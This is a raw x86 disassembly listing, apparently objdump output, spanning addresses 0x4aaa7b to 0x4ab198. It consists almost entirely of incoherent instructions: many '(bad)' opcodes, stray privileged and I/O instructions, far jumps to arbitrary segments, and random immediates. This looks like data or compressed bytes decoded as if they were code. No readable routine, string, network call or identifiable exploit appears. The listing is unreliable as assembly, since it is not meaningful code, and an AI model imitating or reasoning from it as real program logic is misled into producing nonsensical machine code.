  4aaa7b:	cmp    al,0xe
  4aaa7d:	sbb    al,BYTE PTR [eax+0x480088c]
  4aaa83:	push   cs
  4aaa84:	pop    es
  4aaa85:	sub    BYTE PTR [ebp*8-0x719df61d],al
  4aaa8c:	les    esi,FWORD PTR [eax]
  4aaa8e:	and    DWORD PTR [ebx],eax
  4aaa90:	mov    bl,0xf1
  4aaa92:	or     al,0x1b
  4aaa94:	fdivp  st(5),st
  4aaa96:	je     0x4aab17
  4aaa98:	cmp    bl,0x70
  4aaa9b:	jp     0x4aaa93
  4aaa9d:	cdq    
  4aaa9e:	adc    BYTE PTR [ebp+0x4a],dh
  4aaaa1:	mov    ds:0x7552a29b,al
  4aaaa6:	pop    esp
  4aaaa7:	pop    ss
  4aaaa8:	add    edi,DWORD PTR [ecx]
  4aaaaa:	and    al,0x87
  4aaaac:	jge    0x4aaa2e
  4aaaae:	add    al,0x64
  4aaab0:	add    al,BYTE PTR [eax+0x64]
  4aaab3:	cmp    BYTE PTR [eax-0x38],ch
  4aaab6:	sbb    BYTE PTR [ebx-0x69],ah
  4aaab9:	xor    al,0x81
  4aaabb:	fdivr  DWORD PTR [esi-0x2c16e840]
  4aaac1:	mov    WORD PTR [ecx-0x7b6b2935],fs
  4aaac7:	nop
  4aaac8:	mov    eax,ds:0x32dc1851
  4aaacd:	lahf   
  4aaace:	sbb    eax,0x3370f08a
  4aaad3:	mov    BYTE PTR [ecx+ecx*4],dh
  4aaad6:	ins    DWORD PTR es:[edi],dx
  4aaad7:	inc    eax
  4aaad8:	cmp    al,BYTE PTR [edx]
  4aaada:	and    al,0x36
  4aaadc:	pop    esi
  4aaadd:	(bad)  
  4aaade:	jl     0x4aab58
  4aaae0:	das    
  4aaae1:	mov    ah,BYTE PTR [ebp-0x3ffcf88d]
  4aaae7:	cwde   
  4aaae8:	mov    cl,0x6f
  4aaaea:	enter  0x17c0,0x40
  4aaaee:	or     DWORD PTR [ebx+0x64e34f1a],ecx
  4aaaf4:	fstp   TBYTE PTR [eax+0x7f]
  4aaaf7:	adc    eax,0xe9a4440
  4aaafc:	push   cs
  4aaafd:	jo     0x4aab52
  4aaaff:	sbb    BYTE PTR [ecx+0x40],bl
  4aab02:	or     BYTE PTR [esp+ecx*1+0xafdd20],ah
  4aab09:	dec    esi
  4aab0a:	push   ss
  4aab0b:	push   cs
  4aab0c:	jmp    0x4aab7f
  4aab0e:	jns    0x4aab18
  4aab10:	pusha  
  4aab11:	mov    ch,0x4b
  4aab13:	jae    0x4aaa99
  4aab15:	push   ebp
  4aab16:	push   esi
  4aab17:	xor    al,0x6b
  4aab19:	hlt    
  4aab1a:	lea    edx,[ecx]
  4aab1c:	xor    bl,BYTE PTR [eax+0x76]
  4aab1f:	push   cs
  4aab20:	sub    esi,DWORD PTR [esi]
  4aab22:	lock aaa 
  4aab24:	pop    ecx
  4aab25:	push   edi
  4aab26:	push   ecx
  4aab27:	add    eax,0x5169d753
  4aab2c:	outs   dx,DWORD PTR ds:[esi]
  4aab2d:	pop    ss
  4aab2e:	or     eax,0xf8aa2d38
  4aab33:	inc    edx
  4aab34:	imul   esp,DWORD PTR [esi-0x39b4fc9e],0xa03639bd
  4aab3e:	inc    edx
  4aab3f:	inc    edx
  4aab40:	push   esp
  4aab41:	cli    
  4aab42:	add    al,0x6
  4aab44:	and    cl,al
  4aab46:	jmp    0x4aaba6
  4aab48:	inc    eax
  4aab49:	pop    ecx
  4aab4a:	ret    0x88db
  4aab4d:	push   DWORD PTR [eax+0x1695459f]
  4aab53:	gs xchg esp,eax
  4aab55:	repnz sbb bl,BYTE PTR [ecx-0x575b4a65]
  4aab5c:	mov    esi,0x180d77ef
  4aab61:	pop    ss
  4aab62:	or     DWORD PTR [ebp-0x49],ecx
  4aab65:	shr    BYTE PTR [ecx+0x4b],1
  4aab68:	icebp  
  4aab69:	xchg   edx,eax
  4aab6a:	xor    esi,esi
  4aab6c:	js     0x4aab2c
  4aab6e:	sub    esp,DWORD PTR [ebx]
  4aab70:	and    BYTE PTR [eax+eiz*1],bl
  4aab73:	test   eax,0xf13d64ba
  4aab78:	push   ebx
  4aab79:	outs   dx,BYTE PTR ds:[esi]
  4aab7a:	shl    BYTE PTR cs:[esi-0x38c1497],0x99
  4aab82:	push   eax
  4aab83:	push   ecx
  4aab84:	test   al,0x24
  4aab86:	mov    cl,0xb1
  4aab88:	xchg   esp,eax
  4aab89:	push   esp
  4aab8a:	es lock mov ds,ebx
  4aab8e:	in     al,dx
  4aab8f:	sbb    ah,BYTE PTR [ebp+0xaf16c0e]
  4aab95:	icebp  
  4aab96:	ret    
  4aab97:	mov    al,ds:0x49c46ff0
  4aab9c:	sub    eax,0x10462b6f
  4aaba1:	sbb    ebp,DWORD PTR [edx*1+0x714720c2]
  4aaba8:	sub    edi,DWORD PTR [ebp+0x81c9080]
  4aabae:	outs   dx,DWORD PTR ds:[esi]
  4aabaf:	(bad)
  4aabb3:	or     DWORD PTR [ecx+eax*4-0x7],edi
  4aabb7:	push   es
  4aabb8:	or     BYTE PTR [eax+esi*4-0x2c0c390],dl
  4aabbf:	iret   
  4aabc0:	cwde   
  4aabc1:	rcr    BYTE PTR [esi+0x35],0xb2
  4aabc5:	scas   eax,DWORD PTR es:[edi]
  4aabc6:	aaa    
  4aabc7:	dec    ebx
  4aabc8:	sbb    dh,BYTE PTR [edi+esi*1+0x8]
  4aabcc:	jmp    0x8507:0x1387c712
  4aabd3:	mov    bh,0x2a
  4aabd5:	mov    edi,DWORD PTR [eax-0x11]
  4aabd8:	adc    ebp,ebx
  4aabda:	dec    esp
  4aabdb:	inc    ecx
  4aabdc:	mov    DWORD PTR [ecx],edi
  4aabde:	or     BYTE PTR [edi],0x0
  4aabe1:	neg    ch
  4aabe3:	inc    ecx
  4aabe4:	mov    esi,0x7ff13b2f
  4aabe9:	sub    eax,0xbd3e4a8d
  4aabee:	scas   eax,DWORD PTR es:[edi]
  4aabef:	add    BYTE PTR [eax+0x7ef1e738],0xf3
  4aabf6:	sub    al,0x16
  4aabf8:	pop    es
  4aabf9:	test   DWORD PTR [ebx+0xb11bd83],edx
  4aabff:	xchg   edi,eax
  4aac00:	push   ds
  4aac01:	dec    ecx
  4aac02:	mov    edi,0x84891392
  4aac07:	mov    bh,0xdc
  4aac09:	data16 (bad) 
  4aac0b:	das    
  4aac0c:	jmp    0x867f:0xc7ae10cb
  4aac13:	xchg   esi,eax
  4aac14:	push   edi
  4aac15:	lods   eax,DWORD PTR ds:[esi]
  4aac16:	adc    eax,0x778d011c
  4aac1b:	rcl    BYTE PTR [edx-0x56],cl
  4aac1e:	xchg   DWORD PTR [edx-0x1ab075f9],ecx
  4aac24:	pop    edx
  4aac25:	cld    
  4aac26:	cmp    BYTE PTR [eax],0x8
  4aac29:	mov    BYTE PTR [edx],dl
  4aac2b:	or     BYTE PTR [edx+ebx*8-0x71],dl
  4aac2f:	and    al,0x71
  4aac31:	cmp    al,0x14
  4aac33:	push   cs
  4aac34:	ficom  DWORD PTR [eax-0x2d56e1f0]
  4aac3a:	rcl    BYTE PTR [ecx+0x20557a9],cl
  4aac40:	in     al,dx
  4aac41:	xchg   ebp,eax
  4aac42:	pop    es
  4aac43:	test   BYTE PTR [edx],bh
  4aac45:	mov    gs,WORD PTR [esi]
  4aac47:	in     al,0xa4
  4aac49:	push   eax
  4aac4a:	inc    ebx
  4aac4b:	cmp    BYTE PTR [edi+0x15377573],al
  4aac51:	loopne 0x4aabd9
  4aac53:	xor    BYTE PTR [ebp+eax*1+0xe24802b],0x83
  4aac5b:	test   dh,ch
  4aac5d:	test   BYTE PTR [eax],dl
  4aac5f:	or     edx,DWORD PTR [eax-0x4d]
  4aac62:	dec    edx
  4aac63:	add    BYTE PTR [eax],dh
  4aac65:	fdivr  DWORD PTR [esi]
  4aac67:	mov    dl,BYTE PTR [esi-0x20]
  4aac6a:	shl    DWORD PTR [ebx],0x13
  4aac6d:	push   eax
  4aac6e:	jp     0x4aac30
  4aac70:	js     0x4aacab
  4aac72:	jl     0x4aac70
  4aac74:	addr16 inc edx
  4aac76:	inc    ecx
  4aac77:	stos   BYTE PTR es:[edi],al
  4aac78:	push   ebx
  4aac79:	add    DWORD PTR [eax+0x1f00177b],eax
  4aac7f:	data16 daa 
  4aac81:	add    DWORD PTR [eax+0x3c2a1d7b],ebx
  4aac87:	cmp    dh,BYTE PTR [ecx+0x17]
  4aac8a:	adc    BYTE PTR [edx],0x24
  4aac8d:	dec    ebx
  4aac8e:	and    BYTE PTR [esi+0x18],dl
  4aac91:	push   eax
  4aac92:	nop
  4aac93:	jo     0x4aaca2
  4aac95:	add    al,0xa7
  4aac97:	push   ebx
  4aac98:	fiadd  DWORD PTR [ebp+0x3db5f0d9]
  4aac9e:	push   edx
  4aac9f:	fs push ss
  4aaca1:	faddp  st(1),st
  4aaca3:	dec    ebp
  4aaca4:	imul   edx,esp,0xa
  4aaca7:	sbb    al,0xce
  4aaca9:	mov    edx,DWORD PTR [ebx+0x8]
  4aacac:	enter  0x4a1,0x3
  4aacb0:	in     al,0xdd
  4aacb2:	je     0x4aad05
  4aacb4:	push   0x93526e05
  4aacb9:	(bad)  
  4aacba:	(bad)  
  4aacbb:	adc    BYTE PTR [esp+esi*2],bh
  4aacbe:	dec    eax
  4aacbf:	push   edi
  4aacc0:	nop    DWORD PTR [ecx+esi*4-0x4152ba31]
  4aacc8:	pop    edx
  4aacc9:	pop    ecx
  4aacca:	sbb    DWORD PTR [ebp+0x3],esp
  4aaccd:	jne    0x4aad34
  4aaccf:	bound  ebp,QWORD PTR [ecx]
  4aacd1:	jb     0x4aac67
  4aacd3:	and    BYTE PTR [esi],bl
  4aacd5:	mov    al,0x3d
  4aacd7:	push   0x1c
  4aacd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4aacda:	inc    edx
  4aacdb:	add    bl,BYTE PTR [esp+edx*1+0x110c6dd8]
  4aace2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4aace3:	sub    DWORD PTR [ebp-0x18],eax
  4aace6:	mov    al,ds:0x855bec1c
  4aaceb:	add    al,0x9c
  4aaced:	push   es
  4aacee:	aas    
  4aacef:	jne    0x4aac7d
  4aacf1:	dec    ebx
  4aacf2:	xchg   edx,eax
  4aacf3:	push   ss
  4aacf4:	lods   al,BYTE PTR ds:[si]
  4aacf6:	cmp    BYTE PTR [edi],bh
  4aacf8:	or     DWORD PTR [ebx+0x20],esi
  4aacfb:	es push edi
  4aacfd:	or     BYTE PTR [eiz*4+0x31395c52],cl
  4aad04:	rcr    BYTE PTR [esp+edi*4+0x12502c38],cl
  4aad0b:	cmp    edi,ecx
  4aad0d:	icebp  
  4aad0e:	iret   
  4aad0f:	out    0x81,eax
  4aad11:	pushf  
  4aad12:	jmp    0xe0cfadd0
  4aad17:	push   eax
  4aad18:	test   DWORD PTR [ebx+0x58c217c],edi
  4aad1e:	loopne 0x4aacad
  4aad20:	or     eax,0x28998546
  4aad25:	mov    edx,0x833b510d
  4aad2a:	xor    eax,0x55ca8690
  4aad2f:	push   ebx
  4aad30:	enter  0xc4,0xb4
  4aad34:	adc    al,0xa2
  4aad36:	mov    eax,0x90ca3578
  4aad3b:	push   esi
  4aad3c:	cld    
  4aad3d:	fs inc ebx
  4aad3f:	and    BYTE PTR ds:0xf6030482,dh
  4aad45:	jecxz  0x4aad97
  4aad47:	outs   dx,DWORD PTR ds:[esi]
  4aad48:	lock mov cl,0x92
  4aad4b:	push   edi
  4aad4c:	mov    cl,0xee
  4aad4e:	call   0x3a0ef55
  4aad53:	cdq    
  4aad54:	bound  eax,QWORD PTR [ecx+0x79]
  4aad57:	cmp    eax,DWORD PTR [ecx]
  4aad59:	iret   
  4aad5a:	(bad)  
  4aad5b:	inc    ecx
  4aad5c:	imul   esp,DWORD PTR [ebp-0x74],0x3a0bc5d5
  4aad63:	pusha  
  4aad64:	cmp    eax,0xd280d666
  4aad69:	loop   0x4aad30
  4aad6b:	(bad)
  4aad6e:	out    0x88,al
  4aad70:	xor    edx,edx
  4aad72:	(bad)  
  4aad73:	loopne 0x4aad19
  4aad75:	mov    gs,WORD PTR [ecx]
  4aad77:	cmp    edx,DWORD PTR [ebp-0x1c]
  4aad7a:	adc    al,0x0
  4aad7c:	mov    esp,0xd2e2ae40
  4aad81:	cmp    eax,DWORD PTR [ebp+0xd840d78]
  4aad87:	inc    edx
  4aad88:	xchg   edi,eax
  4aad89:	xor    eax,0x521600b5
  4aad8e:	mov    edi,0x76b30d10
  4aad93:	loope  0x4aad97
  4aad95:	or     DWORD PTR [ebx+0x6c],ebx
  4aad98:	cdq    
  4aad99:	mov    ch,0x88
  4aad9b:	pop    esi
  4aad9c:	xor    al,0x52
  4aad9e:	ins    DWORD PTR es:[edi],dx
  4aad9f:	jmp    0x4aad77
  4aada1:	push   es
  4aada2:	call   FWORD PTR [edx+0x56061402]
  4aada8:	push   es
  4aada9:	or     cl,BYTE PTR [edx-0x65da9f2d]
  4aadaf:	test   eax,0x9b180265
  4aadb4:	shr    BYTE PTR [ecx-0x3e],1
  4aadb7:	int3   
  4aadb8:	dec    edx
  4aadb9:	rcr    DWORD PTR [ecx-0x1f],0xa
  4aadbd:	cmp    cl,BYTE PTR [ecx]
  4aadbf:	repz mov ebx,DWORD PTR ds:0x85d80877
  4aadc6:	enter  0xb253,0x52
  4aadca:	mov    BYTE PTR [esi],al
  4aadcc:	and    al,0xf
  4aadce:	js     0x4aadcb
  4aadd0:	and    al,0x1
  4aadd2:	outs   dx,DWORD PTR ds:[esi]
  4aadd3:	mov    dl,BYTE PTR [eax]
  4aadd5:	mov    BYTE PTR [esi+0x7],al
  4aadd8:	mov    al,0x64
  4aadda:	mov    ah,0x6f
  4aaddc:	inc    ecx
  4aaddd:	cmp    al,BYTE PTR [ebx]
  4aaddf:	adc    BYTE PTR [ecx],al
  4aade1:	pop    es
  4aade2:	fs mov esp,0x30efa83
  4aade8:	mov    al,ds:0xed5370b4
  4aaded:	enter  0x105f,0x4
  4aadf1:	push   ecx
  4aadf2:	push   eax
  4aadf3:	or     al,0x18
  4aadf5:	sub    BYTE PTR [eax+0x17],ah
  4aadf8:	pop    es
  4aadf9:	xor    esi,DWORD PTR [eax-0x2793f5b2]
  4aadff:	pusha  
  4aae00:	sub    eax,DWORD PTR [eax]
  4aae02:	add    DWORD PTR [edx],edx
  4aae04:	pop    esi
  4aae05:	add    eax,0xa90e8803
  4aae0a:	jnp    0x4aae0c
  4aae0c:	or     dl,BYTE PTR [ebx-0x18]
  4aae0f:	(bad)  [edx+0x48448c7]
  4aae15:	sar    BYTE PTR cs:[ecx+0x14],0x5
  4aae1a:	test   DWORD PTR [edi],ecx
  4aae1c:	je     0x4aadc2
  4aae1e:	gs pop edi
  4aae20:	sub    al,0xac
  4aae22:	xchg   esi,eax
  4aae23:	test   DWORD PTR [ebx-0x58a2f4f5],edi
  4aae29:	cmp    eax,0xc2cb34a6
  4aae2e:	pop    ebx
  4aae2f:	sub    eax,0x63c29bc1
  4aae34:	popa   
  4aae35:	push   esp
  4aae36:	cmp    DWORD PTR [ebx+0x50072057],esp
  4aae3c:	retf   
  4aae3d:	inc    ebx
  4aae3e:	cmp    DWORD PTR ss:[eax+0x19],0x96a92c18
  4aae46:	test   DWORD PTR [ebx],ecx
  4aae48:	out    0x57,al
  4aae4a:	cmp    DWORD PTR [edx+0x47180ab0],esi
  4aae50:	pop    eax
  4aae51:	mov    al,0x82
  4aae53:	aad    0x7b
  4aae55:	dec    esi
  4aae56:	retf   
  4aae57:	inc    ebx
  4aae58:	dec    ecx
  4aae59:	mov    WORD PTR [esi+0x59],gs
  4aae5c:	icebp  
  4aae5d:	jnp    0x4aae2a
  4aae5f:	ret    0x3b03
  4aae62:	clc    
  4aae63:	dec    ebp
  4aae64:	xor    al,0xb0
  4aae66:	adc    ebx,DWORD PTR [eax-0x1d]
  4aae69:	(bad)  
  4aae6a:	jns    0x4aadf0
  4aae6c:	xchg   DWORD PTR [ecx+0x1f],esp
  4aae6f:	scas   al,BYTE PTR es:[edi]
  4aae70:	rol    BYTE PTR ds:[esi],cl
  4aae73:	sub    ecx,edi
  4aae75:	inc    ecx
  4aae76:	push   ecx
  4aae77:	(bad)  
  4aae78:	fnstenv [ecx]
  4aae7a:	pop    ecx
  4aae7b:	ret    0x3814
  4aae7e:	mov    DWORD PTR [ecx],ebp
  4aae80:	inc    esp
  4aae81:	mov    BYTE PTR [esp+eax*1],ch
  4aae84:	dec    esi
  4aae85:	stos   DWORD PTR es:[edi],eax
  4aae86:	stos   DWORD PTR es:[edi],eax
  4aae87:	loopne 0x4aae19
  4aae89:	lock jo 0x4aaec5
  4aae8c:	sti    
  4aae8d:	out    0x2d,al
  4aae8f:	or     al,0x84
  4aae91:	shl    DWORD PTR [edx-0x7d9a7c62],0xb4
  4aae98:	xchg   esi,eax
  4aae99:	adc    al,0x3b
  4aae9c:	popa   
  4aae9d:	jl     0x4aaef3
  4aae9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aaea0:	mov    BYTE PTR [eax+edi*1],0xdb
  4aaea4:	xchg   ecx,eax
  4aaea5:	clc    
  4aaea6:	imul   ebp,DWORD PTR [ecx-0x6f],0xfffffff1
  4aaeaa:	cmp    edi,ecx
  4aaeac:	jae    0x4aaeb6
  4aaeae:	add    ecx,DWORD PTR [eax]
  4aaeb0:	add    al,0xc2
  4aaeb2:	sahf   
  4aaeb3:	mov    bl,0x5f
  4aaeb5:	add    eax,ecx
  4aaeb7:	push   ebx
  4aaeb8:	mov    esp,0xffa6929a
  4aaebd:	adc    al,0xf0
  4aaebf:	dec    eax
  4aaec0:	mov    eax,DWORD PTR [ebp+0xc]
  4aaec3:	add    al,0xe2
  4aaec5:	mov    DWORD PTR [eax-0x4ff855c2],edi
  4aaecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4aaecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aaecd:	or     eax,0xf604767d
  4aaed2:	inc    esp
  4aaed3:	xchg   edx,eax
  4aaed4:	loope  0x4aae5c
  4aaed6:	pop    es
  4aaed7:	xor    DWORD PTR [ebp-0x4f3d8bd6],esi
  4aaedd:	push   edx
  4aaede:	rol    DWORD PTR [eax-0x1cdbaa23],0x14
  4aaee5:	repz mov eax,0x37dd53c9
  4aaeeb:	adc    ebp,edx
  4aaeed:	push   edi
  4aaeee:	sbb    edi,ebp
  4aaef0:	mov    bh,0x16
  4aaef2:	(bad)  
  4aaef3:	popa   
  4aaef4:	push   ecx
  4aaef5:	fcmovnu st,st(4)
  4aaef7:	fiadd  DWORD PTR [ebx]
  4aaef9:	retf   
  4aaefa:	xchg   ebp,eax
  4aaefb:	pop    eax
  4aaefc:	or     al,0x6c
  4aaefe:	or     esi,DWORD PTR [esi+0x7]
  4aaf01:	add    BYTE PTR [ebp-0x65],dl
  4aaf04:	dec    edi
  4aaf05:	mov    ecx,0x8c812c64
  4aaf0a:	push   esi
  4aaf0b:	add    BYTE PTR [ebp+0x6daf186f],ah
  4aaf11:	or     ecx,DWORD PTR [ecx]
  4aaf13:	mov    al,0xf0
  4aaf15:	sar    DWORD PTR [edi+eax*4-0x6e],cl
  4aaf19:	jle    0x4aaf8c
  4aaf1b:	sbb    eax,0x16c11f39
  4aaf20:	adc    DWORD PTR [edi-0x2f],edx
  4aaf23:	and    cl,BYTE PTR [esi]
  4aaf25:	sub    eax,0xaa6d56e8
  4aaf2a:	loopne 0x4aaeea
  4aaf2c:	scas   eax,DWORD PTR es:[edi]
  4aaf2d:	add    al,0x3f
  4aaf2f:	jl     0x4aaf77
  4aaf31:	lock sub BYTE PTR [ebp+0xe60416d],ch
  4aaf38:	leave  
  4aaf39:	pop    esi
  4aaf3a:	xor    dh,dh
  4aaf3c:	push   ebx
  4aaf3d:	or     ch,BYTE PTR [esp+ecx*8]
  4aaf40:	push   edx
  4aaf41:	or     DWORD PTR [edi+0x6],edi
  4aaf44:	inc    eax
  4aaf45:	or     ebx,DWORD PTR [esi+0x38]
  4aaf48:	ins    BYTE PTR es:[edi],dx
  4aaf49:	cmp    BYTE PTR [edx+0x38],ch
  4aaf4c:	div    BYTE PTR [esi+0x5a37566d]
  4aaf52:	lods   al,BYTE PTR ds:[esi]
  4aaf53:	(bad)  
  4aaf54:	push   ebp
  4aaf55:	push   ecx
  4aaf56:	add    eax,0x521a3480
  4aaf5b:	loop   0x4aaf9e
  4aaf5d:	rcl    BYTE PTR [edi],0x11
  4aaf60:	mov    edi,DWORD PTR [ecx]
  4aaf62:	dec    esi
  4aaf63:	cmp    BYTE PTR [edi],dh
  4aaf65:	pop    eax
  4aaf66:	or     esi,esi
  4aaf68:	xor    ecx,DWORD PTR [ecx-0x467445f0]
  4aaf6e:	inc    esi
  4aaf6f:	mov    cl,BYTE PTR [ecx]
  4aaf71:	outs   dx,DWORD PTR ds:[esi]
  4aaf72:	rol    DWORD PTR [eax-0x7db31000],0x1d
  4aaf79:	inc    ebx
  4aaf7a:	push   eax
  4aaf7b:	push   esp
  4aaf7c:	in     eax,dx
  4aaf7d:	shr    bh,1
  4aaf7f:	and    DWORD PTR [esi],0x46
  4aaf82:	sub    dh,BYTE PTR [ecx]
  4aaf84:	repnz sbb eax,0x91258d9
  4aaf8a:	shr    BYTE PTR [ebx+0x6548893a],1
  4aaf90:	xor    al,0xab
  4aaf92:	mov    edx,0xa7642c02
  4aaf97:	rcl    BYTE PTR [edx+0x42],0xe
  4aaf9b:	jmp    0xe06d:0x6b6d9a5c
  4aafa2:	cmp    BYTE PTR [ebp+0x10],cl
  4aafa5:	call   0xd887e4ef
  4aafaa:	or     al,0x75
  4aafac:	adc    al,0x48
  4aafae:	cmp    DWORD PTR [eax],ecx
  4aafb0:	mov    eax,0x8126a941
  4aafb5:	and    eax,0x938f2dc
  4aafba:	ins    DWORD PTR es:[edi],dx
  4aafbb:	mov    cl,0xac
  4aafbd:	adc    BYTE PTR [edi+0x5b348e99],bl
  4aafc3:	or     DWORD PTR [ecx+0x7833450a],ebx
  4aafc9:	sub    ebp,ebp
  4aafcb:	lock adc edi,DWORD PTR [ecx]
  4aafce:	inc    edi
  4aafcf:	je     0x4ab004
  4aafd1:	mov    ah,0xe
  4aafd3:	push   edx
  4aafd4:	push   es
  4aafd5:	adc    BYTE PTR [esi+0x40062808],bl
  4aafdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aafdc:	adc    bl,BYTE PTR [eax+edi*4]
  4aafdf:	mov    WORD PTR [eax],es
  4aafe1:	not    bh
  4aafe3:	shr    DWORD PTR [ecx],cl
  4aafe5:	popa   
  4aafe6:	stos   DWORD PTR es:[edi],eax
  4aafe7:	add    dh,BYTE PTR [eax+0xe]
  4aafea:	(bad)  
  4aafeb:	xor    al,0x0
  4aafed:	imul   ecx,DWORD PTR [ebp+0x71cf4612],0x5697002
  4aaff7:	sbb    ah,BYTE PTR [edx-0x5c]
  4aaffa:	outs   dx,DWORD PTR ds:[esi]
  4aaffb:	add    ebx,DWORD PTR [eax+0x43bb1c4d]
  4ab001:	sbb    DWORD PTR [edx+0x3b32926],edi
  4ab007:	jp     0x4ab02f
  4ab009:	lea    esp,[esi]
  4ab00b:	pop    ds
  4ab00c:	add    cl,0xb4
  4ab00f:	imul   edi,ebx,0x2e
  4ab012:	pop    ebp
  4ab013:	xchg   edx,eax
  4ab014:	(bad)  
  4ab015:	ret    0x8d83
  4ab018:	dec    esp
  4ab019:	push   0x30ce6350
  4ab01e:	push   edi
  4ab01f:	int3   
  4ab020:	das    
  4ab021:	and    eax,DWORD PTR [ebx]
  4ab023:	or     ecx,DWORD PTR [eax-0x4]
  4ab026:	and    esp,edx
  4ab028:	cmp    eax,0x7c522b36
  4ab02d:	dec    ebp
  4ab02e:	je     0x4ab079
  4ab030:	arpl   WORD PTR ds:0x420f8bd6,di
  4ab036:	add    BYTE PTR [esi+0x5838acc2],al
  4ab03c:	adc    bh,dh
  4ab03e:	fstp   DWORD PTR [ebp-0x8]
  4ab041:	and    edi,DWORD PTR [eax+0x2d]
  4ab044:	out    0xd6,al
  4ab046:	add    edx,DWORD PTR [eax]
  4ab048:	int    0xe0
  4ab04a:	cmp    BYTE PTR [eax+edi*8],bl
  4ab04d:	adc    ch,ch
  4ab04f:	test   bl,dh
  4ab051:	xchg   BYTE PTR [ecx],al
  4ab053:	pop    edi
  4ab054:	sub    cl,BYTE PTR cs:[ecx+0x60]
  4ab058:	add    edx,DWORD PTR [edi]
  4ab05a:	push   0xe218fa06
  4ab05f:	mov    bl,0xf2
  4ab061:	inc    esi
  4ab062:	sbb    BYTE PTR [eax+0x59],dh
  4ab065:	cwde   
  4ab066:	adc    cl,al
  4ab068:	jmp    0x4ab051
  4ab06a:	inc    esi
  4ab06b:	pop    esp
  4ab06c:	add    al,0x44
  4ab06e:	cmp    al,0x7
  4ab070:	or     ebp,esp
  4ab072:	fs push 0xc8360603
  4ab078:	fdiv   DWORD PTR [edi+0x5b1c6481]
  4ab07e:	xchg   ebp,eax
  4ab07f:	ret    0x5658
  4ab082:	and    DWORD PTR [ecx+eiz*4],ebp
  4ab085:	inc    ecx
  4ab086:	push   ds
  4ab087:	xchg   esi,eax
  4ab088:	push   esi
  4ab089:	push   esi
  4ab08a:	sub    edi,DWORD PTR [ebx+0x30]
  4ab08d:	cli    
  4ab08e:	and    al,0xcd
  4ab090:	fs pusha 
  4ab092:	xor    eax,0x25002c68
  4ab097:	sub    ch,BYTE PTR [ecx+0x531aec10]
  4ab09d:	cmp    eax,0x89eda2b6
  4ab0a2:	add    edi,DWORD PTR [edx+0x3eae2186]
  4ab0a8:	and    DWORD PTR [ecx+0x6],ebp
  4ab0ab:	add    al,0xef
  4ab0ad:	dec    esi
  4ab0ae:	dec    esp
  4ab0af:	stos   DWORD PTR es:[edi],eax
  4ab0b0:	adc    al,0x6e
  4ab0b2:	mov    ds:0xde15cccf,al
  4ab0b7:	les    esp,FWORD PTR [esi-0x40887210]
  4ab0bd:	test   DWORD PTR ds:0xaac13921,0xd0bc79df
  4ab0c7:	and    BYTE PTR [edx],bl
  4ab0c9:	retf   
  4ab0ca:	rol    bh,1
  4ab0cc:	add    edi,esi
  4ab0ce:	inc    ecx
  4ab0cf:	shl    BYTE PTR [edi+0x2c2b93d5],0xdf
  4ab0d6:	and    eax,0x8fec0095
  4ab0db:	lock inc eax
  4ab0dd:	and    ebx,DWORD PTR [ebp+0x3a]
  4ab0e0:	push   ds
  4ab0e1:	pusha  
  4ab0e2:	adc    BYTE PTR [ebx],dl
  4ab0e4:	dec    ebx
  4ab0e5:	lea    edx,[edi]
  4ab0e7:	xor    BYTE PTR [esi],0xbf
  4ab0ea:	dec    edx
  4ab0eb:	pop    ebp
  4ab0ec:	sub    bl,BYTE PTR [edi+0x32]
  4ab0ef:	push   ds
  4ab0f0:	sub    BYTE PTR [ebx-0x58],0x53
  4ab0f4:	push   cs
  4ab0f5:	cld    
  4ab0f6:	jle    0x4ab0da
  4ab0f8:	mov    bl,0x48
  4ab0fa:	(bad)  
  4ab0fb:	loop   0x4ab0db
  4ab0fd:	sub    edi,ecx
  4ab0ff:	fdivr  DWORD PTR [eax+0x64]
  4ab102:	push   0xda2b0029
  4ab107:	push   edx
  4ab108:	(bad)  
  4ab109:	fs jecxz 0x4ab0e5
  4ab10c:	inc    ebx
  4ab10d:	add    ebp,DWORD PTR [eax+0x5a0216ac]
  4ab113:	mov    cl,0x6
  4ab115:	sub    ah,bl
  4ab117:	dec    edx
  4ab118:	or     esi,DWORD PTR [eax]
  4ab11a:	inc    BYTE PTR [ecx-0x7f]
  4ab11d:	jmp    0x3f50f9cf
  4ab122:	mov    esp,0x10fadddc
  4ab127:	ror    DWORD PTR [ebp+0x8],1
  4ab12a:	leave  
  4ab12b:	popf   
  4ab12c:	shl    BYTE PTR [ebx],0x4
  4ab12f:	mov    bl,cl
  4ab131:	dec    ebx
  4ab132:	test   al,0x48
  4ab134:	pusha  
  4ab135:	push   eax
  4ab136:	dec    ebx
  4ab137:	dec    edi
  4ab138:	test   DWORD PTR [edx+0x0],ebx
  4ab13b:	pushf  
  4ab13c:	dec    ebx
  4ab13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ab13e:	push   ss
  4ab13f:	lods   al,BYTE PTR ds:[esi]
  4ab140:	imul   edx,DWORD PTR [ebx],0x5a
  4ab143:	adc    eax,0x21ed9be9
  4ab148:	sbb    BYTE PTR [edx],bl
  4ab14a:	nop
  4ab14b:	add    edi,DWORD PTR [edx+0x4b]
  4ab14e:	add    edi,DWORD PTR [ebp+eiz*8+0x18c3c24a]
  4ab155:	fcom   QWORD PTR [esi]
  4ab157:	mov    dl,0x52
  4ab159:	push   ebx
  4ab15a:	mov    eax,0x4f34bc6e
  4ab15f:	sbb    al,0x40
  4ab161:	and    al,0x2b
  4ab163:	je     0x4ab134
  4ab165:	mov    cl,BYTE PTR ss:[edx+ecx*2]
  4ab169:	xor    BYTE PTR [edi],ch
  4ab16b:	sub    BYTE PTR [esi-0x7eb2b4fd],ch
  4ab171:	mov    ecx,eax
  4ab173:	add    al,0x5f
  4ab175:	push   0x2f
  4ab177:	push   ecx
  4ab178:	jmp    0x1891c9c8
  4ab17d:	leave  
  4ab17e:	adc    eax,0x3c78591c
  4ab183:	inc    esp
  4ab184:	pop    edx
  4ab185:	test   al,0x3a
  4ab187:	sub    BYTE PTR [ebx],0x43
  4ab18a:	inc    ebx
  4ab18b:	ss dec eax
  4ab18d:	add    cl,BYTE PTR [ebp-0x769439bd]
  4ab193:	repnz pop edx
  4ab195:	shr    esi,0xd1
  4ab198:	add    eax,0xd0d658bc
